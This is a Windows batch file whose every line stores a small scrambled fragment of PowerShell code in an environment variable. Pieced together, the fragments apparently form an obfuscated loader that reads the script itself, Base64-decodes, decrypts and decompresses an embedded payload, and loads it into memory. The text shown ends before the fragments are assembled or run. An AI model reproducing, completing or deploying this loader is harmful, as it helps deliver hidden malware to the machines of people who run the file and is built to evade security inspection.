@echo off
set "YvUXfqltrF=k; }"
set "AuhwJGqnwu=16] "
set "jQsnMrfzhg=s) {"
set "MtifbBsXeC=pONM"
set "QvNDZtawza=flec"
set "ESpTaLtyhe=trea"
set "zaExVUJQkW=[IO."
set "RpSHabkgdS=O.Me"
set "JYvcSOopdk=ptog"
set "RwXGMqXOUb=DX);"
set "GZgXRqHRJb= if "
set "FdejVagwLd=();$"
set "dMfjdbHTiQ=$wJP"
set "OFoyyyOYCz=New-"
set "VAzXJaHkgZ=1] -"
set "NDlTkhyqwX=DX ="
set "TbTNqJfJpR=yste"
set "yePPJWltzf=QmjI"
set "QSQXFwLFVB=UGTu"
set "yfLWePAnWi=afTL"
set "viBcmMSYRN=oL'["
set "UkVMQGYNHP=736u"
set "dpwzmgKJUh=yste"
set "dGVsMFAycs=ert]"
set "UgViCQAbXa=ment"
set "OjVfDtGPEf=urit"
set "BSitNFFwnk=6] -"
set "ByddefGrIg=daeR"
set "gfIsQZsRpQ=ct S"
set "iflqWAFdyH== $P"
set "xlVdcMEOFN=[-1."
set "kEQiwFPgOP=ach "
set "OjOgjrqWyD=e.Pa"
set "CNgLBinJjN=fpDX"
set "fdMgZJsEfL=join"
set "sPOPfJoFRI=rofi"
set "oggvwZqQeF=.Cop"
set "FyYqLaZBny=bstr"
set "FsalfzMNIq=pose"
set "yaGebcagSJ=pStr"
set "zdBMXhfLYm=KR, "
set "hwLgkAEZIU=Obje"
set "oroTvTOopR=ionM"
set "zKnkfkNfSK='txe"
set "inCONZFnPG=ispo"
set "DbhQjmFoDa='')("
set "BgxYVLpNaj=ion."
set "mWazxcFQAq=:: '"
set "mRGxHISVhN=ew-O"
set "fEmfGBqkAd= = ["
set "fniLzIutzw=::('"
set "LCluoNjuFP=morF"
set "ofLRZqiQiX=n ''"
set "DaTfnPrFPD=('l0"
set "bWAhluVPLL=('%~f0'"
set "mucPVAkJam=ose("
set "mRiLcwMCYa===')"
set "BbCYxseJQB=..-1"
set "mcaHmjZRYM=Syst"
set "MdNqRQxiMJ=ateD"
set "wekraXifWo=);$j"
set "zLKLdkdoyp= [Sy"
set "oAZdiUAxrb=d;$P"
set "DLFQruphaZ=m.Re"
set "nkPuJVDZRF=le  "
set "suKOvCXRnC=ress"
set "rUMIxIUhMu=he.I"
set "MAziFtfZKq=ck($"
set "scqRYqrUUn=g = "
set "tPZseEdKWi=oArr"
set "XwYEBJMXiJ=in $"
set "PykwSDDEGN=Yi ="
set "mJHJQsLDpc=dn.T"
set "JzysaYuZqK=esFX"
set "HEUKFyoqoN=();$"
set "QXcMksGsCq=ress"
set "lZsqFiLjbh= = N"
set "LdIfRPreuZ=oryS"
set "dcKhpGpNhY=bypa"
set "tCdaYgYSVw=.Ass"
set "QCkXxzlsRC=ztb "
set "MpJTXxZGlp=);$P"
set "OwtZwcMGsv=$rMh"
set "iLPaoAhwgq=sion"
set "kytAPWGWpw=QmjI"
set "okLVgVnFvN=$nfp"
set "yFdPKLDzwe=7Yiv"
set "IhNnngmWgW=;$Dp"
set "fAKTBAigcI=-joi"
set "ESDDJPslkB=F'[-"
set "vkKnBNssiI=cAhe"
set "gUrAPDQFVa=fore"
set "ikaXRZTPat=i, 0"
set "sHvzVSqsmf=.Com"
set "MYxbLuIGQF=onve"
set "oaKRavfTHW=ode]"
set "TrbGDHJDbX=y.Pa"
set "hqxAMXWbzz=gnir"
set "CBUUIbJPiD=MhYi"
set "oSWGLNJJOH=Pdn "
set "zenjxORwyI=[]] "
set "iPSoLCUfjx=rtS4"
set "BWkGMhQMDR=saBm"
set "VwkvTYjJJs=.Sec"
set "zRozzNMLcD=ptor"
set "auVknoPkSx=;$wJ"
set "vCTCWJojwX=yTo("
set "zCZsesKTOa=ress"
set "jlYOHFKXTa=lBlo"
set "KRRJMFKceu=nage"
set "nyUTttVjfV=null"
set "CznVJHLNNc=isfL"
set "FPRTEjnSvC=$LAL"
set "QmgqPgbovk=.Con"
set "xYXKWENuAI=Syst"
set "BsatfJnAdE=S46e"
